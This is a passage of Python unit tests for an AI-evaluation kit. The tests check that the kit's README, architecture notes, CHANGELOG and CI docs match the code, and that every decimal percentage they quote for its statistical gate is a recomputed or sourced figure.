    def test_after_a_change_only_the_changed_outputs_need_a_label_if_the_earlier_labels_covered_every_unchanged_case(self):
        """The relabel wording of every doc: the condition is said, and no doc keeps the unconditional promise."""
        carriers = ("README.md", "docs/ARCHITECTURE.md", "docs/METHODOLOGY.md", "docs/SPRINT_PLAYBOOK.md", "CHANGELOG.md", "templates/github/README.md")
        texts = dict(self.docs, **{"CHANGELOG.md": read_doc("CHANGELOG.md")})
        for name in carriers:
            with self.subTest(doc=name):
                text = " ".join(texts[name].replace("**", "").replace("`", "").split())
                self.assertRegex(text, r"never had a label|never-labeled|never labeled")
                self.assertRegex(text, r"full (earlier )?pass|covered every unchanged case|every case the run still has unchanged")
                self.assertNotRegex(text, r"(?i)only the changed outputs are exported|only the cases whose output changed need a new label|label only what changed|export only the outputs that changed")
                # EVERY mention of the promise carries its condition (a sampled earlier pass leaves never-labeled unchanged cases), not just one per doc
                for match in re.finditer(r"(?i)only the changed outputs need a label", text):
                    with self.subTest(doc=name, at=match.start(), what="the condition follows the promise"):
                        self.assertRegex(text[match.start() : match.start() + 330], r"covered every unchanged case.{0,120}never had a label")
        for name in ("README.md", "docs/METHODOLOGY.md", "docs/ARCHITECTURE.md", "docs/SPRINT_PLAYBOOK.md", "templates/github/README.md"):
            with self.subTest(doc=name, what="labeling only the changed ones biases the true-negative rate"):
                self.assertRegex(" ".join(self.docs[name].split()), r"(?i)bias(es)? the true-negative rate|true-negative rate (is )?bias")
        from evalsprint import labeling

        flat_code = " ".join(labeling.__doc__.split())
        self.assertRegex(flat_code, r"unless the earlier labels already covered every unchanged case")  # the code says it, so do the docs

    def test_the_upgrade_note_says_when_a_v01_baseline_blocks_as_the_real_comparison_found(self):
        """08b of the engineering critic (real v0.1.0 kit against this one): a v0.1 baseline blocks only with a custom judge or a repeat change."""
        changelog = " ".join(read_doc("CHANGELOG.md").replace("**", "").replace("`", "").split())
        opening = changelog.split("### Upgrading from v0.1 to v0.2", 1)[1].split("1. The auto gate rule is new", 1)[0]
        self.assertNotRegex(opening, r"first three items below make the gate block every pull request")
        for phrase in ("only in two cases", "custom judge", "judges_sha", "repeat", "kit-version warning", "require_same_kit_version: true"):
            with self.subTest(phrase=phrase):
                self.assertIn(phrase, opening)
        log = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle4" / "critic-engineering" / "08b_upgrade_note.log"
        if log.exists():
            self.assertIn("judges_sha", log.read_text(encoding="utf-8"))
        # the two blocking cases are the ones the code itself treats as reasons; everything else on that path is a warning
        from evalsprint.gate_defaults import DEFAULT_GATE

        self.assertIs(DEFAULT_GATE["allow_judge_changes"], False)
        self.assertIs(DEFAULT_GATE["allow_repeat_change"], False)
        self.assertIs(DEFAULT_GATE["require_same_kit_version"], False)

    # ------------------------------------------------------------------ counts and leftovers

    def test_the_gate_has_19_keys_and_the_docs_say_so(self):
        from evalsprint.gate_defaults import DEFAULT_GATE

        self.assertEqual(len(DEFAULT_GATE), 19)
        self.assertIn("all 19 keys", self.docs["README.md"])
        self.assertIn("**19 keys**", self.docs["docs/ARCHITECTURE.md"])
        self.assertIn("`len(DEFAULT_GATE)` is 19", self.docs["docs/ARCHITECTURE.md"])
        for name, text in self.docs.items():
            with self.subTest(doc=name):
                self.assertNotRegex(text, r"\b1[678] (gate )?keys\b")
        self.assertEqual(DEFAULT_GATE["tag_drop_min_cases"], 20)
        for name in ("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"):
            with self.subTest(doc=name, key="tag_drop_min_cases"):
                self.assertNotRegex(self.docs[name], r"tag_drop_min_cases:? ?\(?10\b|tag_drop_min_cases\` \(10\)")
                self.assertIn("20", self.docs[name])

    def test_the_v01_leftovers_are_gone(self):
        self.assertNotIn("At v0.1 this repository", self.docs["README.md"])
        self.assertNotIn("Sizes at v0.1", read_doc("scripts", "project_snapshot.py"))
        self.assertNotIn("major.minor", "\n".join(self.docs.values()), "a different kit version warns at the patch level too (C20)")
        self.assertNotIn("drop the block", "\n".join(self.docs.values()).replace("drop the block can go", ""))
        for name, text in self.docs.items():
            with self.subTest(doc=name):
                self.assertNotRegex(text, r"(?i)gone before any of your code runs|removes? it again before any of your code runs|it is gone before the suite starts")

    def test_the_token_is_described_as_present_during_the_pr_jobs_install(self):
        readme = self.docs["templates/github/README.md"]
        section = readme.split("## 2. Secrets and repository settings", 1)[1].split("## 3.", 1)[0]
        self.assertIn("**is present**", section)
        self.assertIn("vendor the wheel", section.lower().replace("vendor the wheel instead", "vendor the wheel"))
        self.assertIn("./evals/vendor/evalsprint-0.2.0-py3-none-any.whl", section)
        self.assertRegex(section, r"(?i)relative to the directory pip runs in")
        requirements = (TEMPLATES / "evals" / "requirements.txt").read_text(encoding="utf-8")
        self.assertIn("WHO CAN READ THE TOKEN", requirements)
        self.assertIn("is in its environment while that install runs", requirements)
        workflow = (GITHUB / PR_WORKFLOW).read_text(encoding="utf-8")
        self.assertIn("HONEST NOTE: the token IS in the environment of this step", workflow)
        self.assertIn("EVALSPRINT_READ_TOKEN (if you set one) is in its environment", workflow)
        self.assertIn("the PR job", self.docs["docs/ARCHITECTURE.md"])
        self.assertRegex(self.docs["README.md"], r"(?i)can read (that|your kit's read) token")

    # ------------------------------------------------------------------ CHANGELOG (C16)

    def test_the_changelog_has_both_releases_and_the_upgrade_note(self):
        text = read_doc("CHANGELOG.md")
        pyproject = read_doc("pyproject.toml")
        version = re.search(r'(?m)^version = "([^"]+)"', pyproject).group(1)
        self.assertEqual(version, "0.2.0")
        headings = [h for h in re.findall(r"(?m)^## \[([^\]]+)\]", text) if h != "Unreleased"]  # fixes made after the tag wait under [Unreleased]
        self.assertEqual(headings, ["0.2.0", "0.1.0"], "newest first, and only the two releases")
        self.assertEqual(headings[0], version)
        upgrade = text.split("### Upgrading from v0.1 to v0.2", 1)[1].split("\n### ", 1)[0]
        for topic in (
            "auto", "judges_sha", "custom", "data_files", "reviewed pull request", "summary.repeat", "per_tag", "kit version", "--force", "tag_drop_min_cases",
            "evalsprint init", "templates", "EVALSPRINT_READ_TOKEN", "REQUIRE_BASELINE", "auto-small", "84 of the 90",
        ):
            with self.subTest(topic=topic):
                self.assertIn(topic, upgrade)
        added = text.split("### Added", 1)[1].split("### Changed", 1)[0]
        for topic in ("--resume", "noise", "init", "per_tag", "target_retries", "placeholder", "history", "--previous-labels", "labels_budget_table", "attempt_error_rate", "expected_gate_rates"):
            with self.subTest(added=topic):
                self.assertIn(topic, added)
        changed = text.split("### Changed", 1)[1].split("### Known limits", 1)[0]
        for topic in ("RUN_CODE", "explicit file lists", "ARTIFACT_RETENTION_DAYS", "IS present", "vendor the wheel", "placeholder", "84 of 90", "28.8%", "screening flag"):
            with self.subTest(changed=topic):
                self.assertIn(topic, changed)
        # the 0.1.0 entry only claims what v0.1.0 had: no `init`, no `--resume`, no per-tag repeat
        first = text.split("## [0.1.0]", 1)[1]
        for not_in_v01 in ("per_tag", "--resume", "evalsprint init", "noise", "history"):
            with self.subTest(v01_must_not_claim=not_in_v01):
                self.assertNotIn(not_in_v01, first)

    def test_the_upgrade_note_matches_the_compatibility_check_of_the_review(self):
        """The critic's 08_upgrade_compat.sh wrote a v0.1 baseline and compared it with v0.2: a custom judge changes judges_sha, a plain suite does not."""
        log = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle3" / "critic-engineering" / "08_upgrade_compat.log"
        if not log.exists():
            self.skipTest("the review's evidence folder is not in this checkout")
        evidence = log.read_text(encoding="utf-8")
        self.assertIn("judges_sha 68662b5d470b → b912c8f9fcfa", evidence)
        self.assertIn("68662b5d470b -> b912c8f9fcfa", read_doc("CHANGELOG.md"))
        plain = evidence.split("config: plain", 1)[1]
        self.assertIn("judges_changed: False", plain)
        self.assertIn("verdict pass", plain)

    # ------------------------------------------------------------------ the gate paragraph

    CRITIC_GATE_PARAGRAPH = (
        "The gate compares each change with the committed baseline on the same cases. It blocks the change only when the cases that went from pass to fail "
        "outnumber those that went from fail to pass by at least max(3, n/50), and a one-sided exact sign test (McNemar) says that such an imbalance would be "
        "unusual by chance. The test is lenient on small suites (alpha about 24% at 45 cases, 12% at 100, 7% at 150) and tightens to about 5.8% beyond roughly "
        "300 cases. It is a noise-aware threshold, not a guarantee. With 5% random noise per case and one attempt per case, an unchanged system is blocked about "
        "11% of the time at 45 cases, 7% at 100 and 4% at 200, averaged over possible baselines; for one committed baseline the rate can be far higher or lower. "
        "A 10-point drop is caught about 67%, 80% and 93% of the time, and a 5-point drop only about 39%, 42% and 51%. Cases tagged critical sit outside this "
        "statistical rule: any single pass-to-fail flip blocks, so they must be repeated 5 times."
    )

    @staticmethod
    def flat(text: str) -> str:
        return " ".join(text.replace("**", "").replace("`", "").replace("#", " ").split())

    def test_the_gate_paragraph_is_the_methodology_critics_paragraph_and_its_figures_are_recomputed(self):
        """README, the workflow README and METHODOLOGY carry the critic's client paragraph word for word; every figure in it is recomputed."""
        for name in ("README.md", "templates/github/README.md", "docs/METHODOLOGY.md"):
            with self.subTest(doc=name):
                text = self.flat(self.docs[name])
                self.assertRegex(text, r"(?i)how it decides, in one paragraph|the gate in one paragraph")
                self.assertIn(self.CRITIC_GATE_PARAGRAPH, text)
                self.assertIn("What that paragraph leaves out", text)
                self.assertNotIn("was not available", text)
        verdicts = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle3" / "critic-verdicts.md"
        if verdicts.exists():  # the source of the paragraph: a quoted block of the orchestrator's record of the critic's verdict
            quoted = " ".join(line.lstrip("> ").strip() for line in verdicts.read_text(encoding="utf-8").splitlines() if line.startswith(">"))
            self.assertIn(self.CRITIC_GATE_PARAGRAPH, quoted)
        gn = self.gn
        self.assertEqual([round(gn.alpha(n) * 100) for n in (45, 100, 150)], [24, 12, 7])
        self.assertEqual(f"{gn.alpha(301) * 100:.1f}", "5.8")
        self.assertLess(gn.alpha(301) * 100 - gn.alpha(10**6) * 100, 0.1)  # "tightens to about 5.8% beyond roughly 300 cases", towards 5.75
        self.assertEqual([round(gn.rate(n, 0.05, 0.0) * 100) for n in (45, 100, 200)], [11, 7, 4])
        self.assertEqual([round(gn.rate(n, 0.05, 0.10) * 100) for n in (45, 100, 200)], [67, 80, 93])
        self.assertEqual([round(gn.rate(n, 0.05, 0.05) * 100) for n in (45, 100, 200)], [39, 42, 51])
        # the exact figures the paragraph that follows it gives
        self.assertEqual([self.pct(gn.rate(n, 0.05, 0.0)) for n in (45, 100, 200)], ["10.6%", "7.1%", "4.0%"])
        self.assertEqual([self.pct(gn.rate(n, 0.05, 0.10)) for n in (45, 100, 200)], ["66.6%", "79.7%", "92.7%"])
        for name in ("README.md", "templates/github/README.md", "docs/METHODOLOGY.md"):
            with self.subTest(doc=name, what="the figures of the paragraph after it"):
                for figure in ("10.6%", "7.1%", "4.0%", "66.6%", "79.7%", "92.7%", "12.3%", "15.1%", "28.8%", "14.0%", "7.2%"):
                    self.assertIn(figure, self.docs[name])
        arch = self.flat(self.docs["docs/ARCHITECTURE.md"])
        self.assertIn("is the methodology review's client paragraph, word for word", arch)
        self.assertNotIn("was not among the files available", arch)

    def test_the_detection_model_caveat_is_quoted_from_the_validation(self):
        log = ROOT / "orchestration" / "2026-09-29_kit-v0.2" / "cycle4" / "eval-scientist-gate" / "validate_detection_model.log"
        if not log.exists():
            self.skipTest("the gate executor's validation log is not in this checkout")
        text = log.read_text(encoding="utf-8")
        self.assertIn("from -2.36 p.p. (n=30, R=2) to +7.87 p.p. (n=30, R=4)", text)
        for doc in ("docs/METHODOLOGY.md", "templates/github/README.md", "docs/ARCHITECTURE.md"):
            with self.subTest(doc=doc):
                self.assertIn("2.4", self.docs[doc])
                self.assertIn("7.9", self.docs[doc])

    # ------------------------------------------------------------------ the CI wording

    def test_the_ci_docs_say_what_is_validated_and_which_files_are_uploaded(self):
        readme = self.docs["templates/github/README.md"]
        for topic in (
            "case \"$RUN_CODE\" in ''|*[!0-9]*|????*) RUN_CODE=255;; esac", "OutputInjectionTests", "MutationTests", "evals_unvalidated_output.yml",
            "results.jsonl", "summary.json", "calibration.json", "report.html", "gate.md", "gate.json", "ARTIFACT_RETENTION_DAYS", "explicit list of files",
            "forged candidate files", "emulation of the runner, not an observation",
        ):
            with self.subTest(topic=topic):
                self.assertIn(topic, readme)
        arch = self.docs["docs/ARCHITECTURE.md"]
        for topic in ("H2", "H4", "$GITHUB_OUTPUT", "plan", "stage", "run_state", "ARTIFACT_RETENTION_DAYS", "evals_unvalidated_output.yml", "upload_root"):
            with self.subTest(arch=topic):
                self.assertIn(topic, arch)
        workflow = load_workflow(PR_WORKFLOW)
        self.assertEqual(workflow["env"]["ARTIFACT_RETENTION_DAYS"], "14")
        self.assertTrue((FIXTURES_CI / "evals_unvalidated_output.yml").is_file())

    def test_the_baseline_workflow_docs_match_what_it_refuses(self):
        text = (GITHUB / BASELINE_WORKFLOW).read_text(encoding="utf-8")
        for topic in ("placeholder", "attempt_error_rate", "Baseline refused", "target_retries"):
            with self.subTest(topic=topic):
                self.assertIn(topic, text)
        readme = self.docs["templates/github/README.md"]
        self.assertIn("Baseline refused", readme)
        self.assertRegex(readme, r"(?i)placeholder run")


# ------------------------------------------------------------------------------ cycle 4: the CLI surface the docs promise


class DocClaimsTests(unittest.TestCase):
    """Every percentage with a decimal point that a client doc states is a figure this class recomputes, occurrence by occurrence.

    The presence tests of `DocsHonestyTests` say that a figure appears in a doc, not that EVERY mention of it is right: the mutation check
    of cycle 4 changed one of the 26 mentions of 10.6% to 10.7% and the suite stayed green. Here the docs are scanned instead of searched.
    A decimal percentage must be one of three things:

    * part of a list of three (`10.6%, 7.1% and 4.0%`) or a pair (`10.6% to 14.7%`, `5.1% against 7.0%`) that is, as a whole, a
      recomputed triple or pair;
    * a single figure of the recomputed registry below (`12.3%`, `1.11%`, a cell of the README table);
    * a figure that is named here as CARRIED OVER: measured in an earlier cycle (or in v0.1), with its source, and not recomputed by
      any test. Those are listed so that nobody mistakes them for recomputed ones.

    Whole numbers (`80%`, "about 1 in 9") are not scanned: a typo there is not caught by this class.
    """

    SCANNED = dict(
        CLIENT_DOCS,
        **{
            "CHANGELOG.md": ("CHANGELOG.md",),
            "templates/evals/requirements.txt": ("evalsprint", "templates", "evals", "requirements.txt"),
        },
    )
    NUM = r"(\d+(?:\.\d+)?)\s?%"
    TOKEN = re.compile(r"(?<![\w.])" + NUM)
    TRIPLE = re.compile(r"(?<![\w.])" + NUM + r"(?:, | / )" + NUM + r"(?:,? and | / |, )" + NUM)
    PAIR = re.compile(r"(?<![\w.])" + NUM + r" (?:to|against|vs\.?|->) " + NUM)

    CARRIED = {
        "27.5": "share of legitimate text flagged by `injection_suspected`, measured on evalsprint 0.1 and not re-measured (the docs say so)",
        "2.2": "release rate of a judge of true kappa about 0.6 at 40 labels, weighted interval (cycle-3 judge simulation)",
        "3.0": "release rate of a judge of true kappa about 0.6 on the weighted interval, at most (cycle-3 judge simulation)",
        "0.19": "share of relabel paths on which a judge only got better, overall-stratified designs (cycle-4 judge simulation, relabel_bias_table.txt)",
        "99.8": "coverage of the true TNR by the interval when the `tnr_reliable` flag is true, 10,327 replications (cycle-4 judge simulation)",
        "0.10": "false alarm of a unanimity-of-three repeat at 45 cases, the rejected alternative (cycle-3 gate simulation)",
        "43.4": "spurious tag warnings in 10 tags of 10 cases with no change at 5% noise, `tag_drop_min_cases` 10 (cycle-4 methodology review, c5_tag_warnings.json)",
        "3.3": "spurious tag warnings in 5 tags of 20 cases with no change at 5% noise, `tag_drop_min_cases` 20 (cycle-4 methodology review, c5_tag_warnings.json)",
        "14.8": "the same at 10% noise (cycle-4 methodology review, c5_tag_warnings.json)",
    }
    CARRIED_PAIRS = {
        ("10.8", "15.2"): "false alarm with one crash per 100 cases under the v0.1 rule at 45 cases, cycle-2 simulation (superseded by the exact 10.6 to 14.7)",
        ("3.6", "7.9"): "the same simulation at 200 cases (superseded by the exact 4.0 to 8.0)",
        ("10.9", "0.3"): "false alarm of the v0.1 rule at 45 cases before and after a majority of three, the older critic figures (quoted as history)",
    }

    @staticmethod
    def shown(x: float, digits: int = 1) -> str:
        return f"{x * 100:.{digits}f}"

    @classmethod
    def setUpClass(cls):
        gn = cls.gn = shared_gate_numbers()
        cls.texts = {name: read_doc(*parts) for name, parts in cls.SCANNED.items()}
        cls.triples: set[tuple[str, ...]] = set()
        cls.pairs: set[tuple[str, str]] = set()
        cls.singles: set[str] = set(cls.CARRIED)
        show = cls.shown

        def single(*figures: str) -> None:
            cls.singles.update(figures)

        def triple(*figures: str) -> None:
            cls.triples.add(tuple(figures))
            single(*figures)

        def pair(first: str, second: str, both_orders: bool = False) -> None:
            # the two figures of a pair are NOT added to the single figures: a pair is only valid as a pair
            cls.pairs.add((first, second))
            if both_orders:
                cls.pairs.add((second, first))

        # the README table and the headline triples: false alarm at 2% / 5% / 10% noise, detection at 5% noise
        for n in (45, 100, 200, 400):
            triple(show(gn.rate(n, 0.02, 0.0)), show(gn.rate(n, 0.05, 0.0)), show(gn.rate(n, 0.10, 0.0)))
            for drop in (0.05, 0.10, 0.15):
                value = gn.rate(n, 0.05, drop)
                if value >= 0.99:
                    single(show(value))  # the table writes 99.6% with a decimal and the smaller ones as whole numbers
        sizes3 = (45, 100, 200)
        triple(*[show(gn.rate(n, 0.05, 0.0)) for n in sizes3])
        triple(*[show(gn.rate(n, 0.05, 0.10)) for n in sizes3])
        # the peaks, and the most the false alarm is from 150 cases on
        for noise in (0.05, 0.10):
            peak_n = max(range(30, 150), key=lambda n: gn.rate(n, noise, 0.0))
            single(show(gn.rate(peak_n, noise, 0.0)))
            single(show(max(gn.rate(n, noise, 0.0) for n in range(150, 501))))
        # a majority of three attempts, before and after; at 45 cases the two figures the docs also quote on their own
        for n in (30, 45, 60, 100, 149):
            for drop in (0.0, 0.05, 0.10):
                pair(show(gn.rate(n, 0.05, drop)), show(gn.repeat_rate(n, 0.05, drop, 3)))
        single(show(gn.repeat_rate(45, 0.05, 0.0, 3)), show(gn.repeat_rate(45, 0.05, 0.10, 3)))
        # one crash in 100 (pairs) and in 20 (triple)
        for n in sizes3:
            pair(show(gn.rate(n, 0.05, 0.0)), show(gn.crash_false_alarm(n, 0.05, 0.01)))
        triple(*[show(gn.crash_false_alarm(n, 0.05, 0.05)) for n in sizes3])
        # the baseline lottery, before (triples) and after a majority of three in the baseline (the bound the docs state)
        lottery = {n: gn.lottery(n, 0.05) for n in sizes3}
        triple(*[show(lottery[n]["p_over_15"]) for n in sizes3])
        triple(*[show(lottery[n]["median"]) for n in sizes3])
        triple(*[show(lottery[n]["p95"]) for n in sizes3])
        single(show(0.0015, 2))  # "under 0.15%": `test_the_baseline_lottery_is_recomputed` asserts the bound
        # critical tags: 8 of 45 cases
        critical = [gn.critical_rule_false_alarm(8, attempts) for attempts in (1, 3, 5)]
        triple(*[show(x, 2) for x in critical])
        single(show(critical[1]))
        pair(show(critical[0], 0), show(critical[2], 2))
        for critical_attempts, other_attempts in ((3, 3), (5, 3), (5, 5), (5, 1), (1, 1)):
            single(show(gn.whole_gate_false_alarm(45, 8, critical_attempts, other_attempts), 2))  # exact; the independence figures are NOT registered
        # the flip probability of a majority of three, and a broken case caught by a majority of 1 / 3 / 5
        pair(show(0.05, 0), show(gn.majority_flip(3, 0.05), 3))
        single(show(gn.majority_flip(3, 0.05), 3))  # 0.725% on its own
        fails = [DocsNumbersTests.majority_fails(k, 0.8) for k in (1, 3, 5)]
        triple(show(fails[0], 0), show(fails[1]), show(fails[2], 0))
        # heterogeneous noise (9 of 45 cases flip at 20%, the rest at 1%) and the significance level of a large suite
        single(show(gn.mixed_false_alarm([(9, 0.20), (36, 0.01)])))
        single(show(gn.alpha(10**6), 2))
        single(show(gn.alpha(301)))  # "tightens to about 5.8% beyond roughly 300 cases"
        # the rule of v0.1 against the current one, averaged over 60 to 149 cases, and its step at 150
        window = range(60, 150)
        for noise in (0.05, 0.10):
            for drop in (0.0, 0.10):
                new = sum(gn.rate(n, noise, drop) for n in window) / len(window)
                old = sum(gn.rate_rule(n, noise, drop, gn.flag01) for n in window) / len(window)
                pair(show(old), show(new), both_orders=True)
            pair(show(gn.rate_rule(149, noise, 0.10, gn.flag01)), show(gn.rate_rule(150, noise, 0.10, gn.flag01)))
        single(show(max(gn.rate_rule(n, 0.05, 0.0, gn.flag01) for n in range(30, 150))))
        cls.pairs.update(cls.CARRIED_PAIRS)
        single(show(gn.crash_false_alarm(200, 0.05, 0.01)))  # 8.0% on its own, in the template comment and in prose
        # C25b: the pass-rate rule of the recommended protocol (n: 3, critical 5) on its own, the figure `evalsprint noise` prints for it
        single(show(gn.mixed_false_alarm([(37, gn.majority_flip(3, 0.05)), (8, gn.majority_flip(5, 0.05))]), 2))
        # C22: the retry-share warning, exact (`scripts/gate_numbers.py`, `retry_share_warning_rate`): target_retries 1, 100 calls unless stated
        warn = gn.retry_share_warning_rate
        single(show(warn(100, 0.05, 0.05), 2), show(warn(45, 0.05, 0.05), 2))  # an unchanged target against a baseline that crashes on 5% of its calls
        single(show(warn(100, 0.05, 0.10)), show(warn(100, 0.05, 0.20)))  # a candidate that crashes on 10% / 20% of its calls
        triple(show(warn(100, 0.05, 0.10)), show(warn(100, 0.05, 0.20)), show(warn(100, 0.05, 0.50), 0))  # ... and on 50%: the warning always fires
        single(show(warn(100, 0.0, 0.10)), show(warn(100, 0.0, 0.20)))  # the same against a baseline that never retried
        single(show(warn(100, 0.05, 0.05, 1, 0.075), 2), show(warn(100, 0.05, 0.10, 1, 0.075)), show(warn(100, 0.05, 0.10, 1, 0.15), 2))  # the limits that were not chosen

    # ------------------------------------------------------------------ the scan

    @classmethod
    def normalised(cls, text: str) -> str:
        return text.replace("**", "").replace("`", "")

    @classmethod
    def problems(cls, text: str) -> list[str]:
        """What `text` states that is not a registered figure. The text is normalised first (bold and code marks removed)."""
        text = cls.normalised(text)
        covered: set[tuple[int, int]] = set()
        found: list[str] = []
        for kind, regex, registry in (("triple", cls.TRIPLE, cls.triples), ("pair", cls.PAIR, cls.pairs)):
            for match in regex.finditer(text):
                figures = match.groups()
                spans = [match.span(i + 1) for i in range(len(figures))]
                if not any("." in figure for figure in figures) or any(span in covered for span in spans):
                    continue
                covered.update(spans)
                if figures not in registry:
                    found.append(f"{kind} {' / '.join(f + '%' for f in figures)} at {match.start()}: {' '.join(text[max(0, match.start() - 50):match.end() + 30].split())!r}")
        for match in cls.TOKEN.finditer(text):
            if match.span(1) in covered or "." not in match.group(1):
                continue
            if match.group(1) not in cls.singles:
                found.append(f"figure {match.group(1)}% at {match.start()}: {' '.join(text[max(0, match.start() - 50):match.end() + 30].split())!r}")
        return found

    def test_every_decimal_percentage_in_the_client_docs_is_a_recomputed_figure(self):
        for name, text in self.texts.items():
            with self.subTest(doc=name):
                found = self.problems(text)
                self.assertEqual(found, [], f"{name} states {len(found)} figure(s) that no test recomputes")

    def test_the_carried_over_figures_are_still_in_the_docs_and_say_where_they_come_from(self):
        """A carried-over entry that no doc uses any more is dead weight that would let a wrong figure through."""
        everything = self.normalised(" ".join(self.texts.values()))
        for figure, source in self.CARRIED.items():
            with self.subTest(figure=figure):
                self.assertTrue(source.strip())
                self.assertRegex(everything, r"(?<![\w.])" + re.escape(figure) + r"\s?%")
        for (first, second), source in self.CARRIED_PAIRS.items():
            with self.subTest(pair=(first, second)):
                self.assertTrue(source.strip())
                self.assertRegex(everything, re.escape(first) + r"\s?% (?:to|against|vs\.?|->) " + re.escape(second) + r"\s?%")

    def test_a_figure_changed_in_one_place_is_caught_not_only_a_figure_removed_everywhere(self):
        """The mutation sweep: change every decimal percentage of every doc, one at a time, by one unit of its last digit.

        The figures that are not caught are the ones whose changed value is, by chance, another registered figure (7.1% changed to 7.0%
        or 7.2%, which are also registered: the median and the last of the lottery triple); the sweep fails when more than 6% survive
        (2.8% did at the time of writing, 22 of 780, nearly all of them cells of the README tables, which `DocsNumbersTests` checks
        row by row).
        """
        survivors, total = [], 0
        for name, text in self.texts.items():
            text = self.normalised(text)
            self.assertEqual(self.problems(text), [], name)
            for match in self.TOKEN.finditer(text):
                figure = match.group(1)
                if "." not in figure:
                    continue
                digits = len(figure.split(".")[1])
                for step in (1, -1):
                    changed = f"{float(figure) + step * 10 ** -digits:.{digits}f}"
                    mutated = text[: match.start(1)] + changed + text[match.end(1) :]
                    total += 1
                    if not self.problems(mutated):
                        survivors.append(f"{name}: {figure} -> {changed} at {match.start(1)}")
        self.assertGreater(total, 400)
        self.assertLessEqual(len(survivors), total * 0.06, f"{len(survivors)} of {total} one-digit changes went unnoticed, e.g. {survivors[:12]}")

    def test_the_named_mutations_of_cycle_4_are_caught(self):
        """The five single-mention changes the first mutation check let through, and the old independence figures put back."""
        readme = self.texts["README.md"]
        cases = (
            ("README.md", "28.8% at 45 cases", "28.9% at 45 cases"),
            ("README.md", "10.6%, 7.1% and 4.0%", "10.6%, 7.1% and 4.5%"),
            ("docs/ARCHITECTURE.md", "5.79%", "5.97%"),
            ("templates/github/README.md", "12.3%", "12.4%"),
            ("docs/SPRINT_PLAYBOOK.md", "1.11%", "1.13%"),  # the independence figure that used to be quoted
            ("README.md", "36.67%", "39.41%"),
            ("CHANGELOG.md", "5.79%", "5.92%"),
            ("README.md", "in 11.2% when the candidate's calls crash 10% of the time", "in 11.3% when the candidate's calls crash 10% of the time"),
            ("docs/METHODOLOGY.md", "in 88.8% at 20%", "in 88.9% at 20%"),
            ("docs/ARCHITECTURE.md", "an unchanged target warns in 0.12% of the comparisons", "an unchanged target warns in 0.13% of the comparisons"),
            ("templates/github/README.md", "0.77% of the time and on 10% crashing calls 24.7% of the time", "0.77% of the time and on 10% crashing calls 25.7% of the time"),
            ("README.md", "43.4% of the runs at 5% noise", "43.5% of the runs at 5% noise"),
            ("CHANGELOG.md", "0.12% false warnings at 100 calls", "0.13% false warnings at 100 calls"),
        )
        for name, old, new in cases:
            with self.subTest(doc=name, mutation=f"{old} -> {new}"):
                text = self.texts[name]
                self.assertIn(old, text)
                self.assertEqual(self.problems(text), [])
                self.assertTrue(self.problems(text.replace(old, new, 1)), "the changed mention was not noticed")
        self.assertTrue(readme)


class PlatformDocsTests(unittest.TestCase):
    """What the docs say about the platform details (exit codes, resume, retries, placeholder, per_tag, noise) is tied to the code.

    Each test reads a constant or calls a function of the kit and then looks for the statement in every doc that has to make it, so a
    doc cannot keep saying "exit codes 0 to 3" after the kit returns 130 and 143, or "5 retries" after the limit moves.
    """

    SPOTS = {
        "README.md": ("README.md",),
        "docs/ARCHITECTURE.md": ("docs", "ARCHITECTURE.md"),
        "templates/github/README.md": ("evalsprint", "templates", "github", "README.md"),
        "templates/eval.yaml": ("evalsprint", "templates", "eval.yaml"),
        "docs/SPRINT_PLAYBOOK.md": ("docs", "SPRINT_PLAYBOOK.md"),
        "CHANGELOG.md": ("CHANGELOG.md",),
    }

    @classmethod
    def setUpClass(cls):
        cls.docs = {name: " ".join(read_doc(*parts).replace("**", "").split()) for name, parts in cls.SPOTS.items()}

    def each(self, names, pattern, what=""):
        for name in names:
            with self.subTest(doc=name, statement=what or pattern):
                self.assertRegex(self.docs[name], pattern)

    def test_exit_codes_130_and_143_are_in_every_exit_code_list(self):
        from evalsprint import cli

        self.assertEqual((cli.EXIT_INTERRUPTED, cli.EXIT_TERMINATED), (130, 143))
        self.assertIn("143", cli.__doc__)
        self.each(("README.md",), r"Exit codes: .*`130` interrupted \(Ctrl-C\) and `143` terminated \(`SIGTERM`", "the README exit code list")
        self.each(("docs/ARCHITECTURE.md",), r"Exit codes: .*`130` interrupted \(Ctrl-C\) and `143` terminated \(`SIGTERM`", "the ARCHITECTURE exit code list")
        self.each(("templates/github/README.md",), r"\| 130 or 143 \| `run` \| interrupted \(Ctrl-C\) or terminated \(`SIGTERM`", "the workflow README exit code table")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"), r"\b143\b", "143")
        self.each(("docs/SPRINT_PLAYBOOK.md",), r"Ctrl-C exits 130, a cancelled job or a stopped container exits 143", "the playbook risk row")

    def test_the_resume_lock_and_what_the_fingerprint_covers_are_documented_as_the_code_does_it(self):
        from evalsprint import runner

        self.assertEqual(runner.LOCK_NAME, ".resume.lock")
        self.assertEqual(runner._MISMATCH_PARTS, ("judges_sha", "target", "target_source", "repeat"))
        config = types_namespace(target={"callable": str(ROOT / "evalsprint" / "templates" / "target_adapter.py") + ":offline_stub"}, base_dir=ROOT)
        fingerprint = runner.target_fingerprint(config)
        self.assertEqual(set(fingerprint), {"callable", "params", "source_sha"})
        self.assertRegex(fingerprint["source_sha"], r"^[0-9a-f]{12}$")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), r"\.resume\.lock", "the lock file")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), r"`kill -9`.{0,40}harmless|kill -9.{0,60}harmless", "a stale lock is harmless")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"), r"source_sha", "target.source_sha")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"), r"(?i)modules (that|it|the) (file |adapter )?imports?.{0,40}not (detected|hashed|covered)|not the modules", "imported modules are not detected")
        for part in runner._MISMATCH_PARTS:
            self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md"), re.escape(part), f"fingerprint_mismatch value {part}")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"), r"fingerprint_mismatch", "resumed_from.fingerprint_mismatch")
        self.each(("README.md", "docs/ARCHITECTURE.md", "templates/github/README.md", "CHANGELOG.md"), r"retried_errors", "resumed_from.retried_errors")
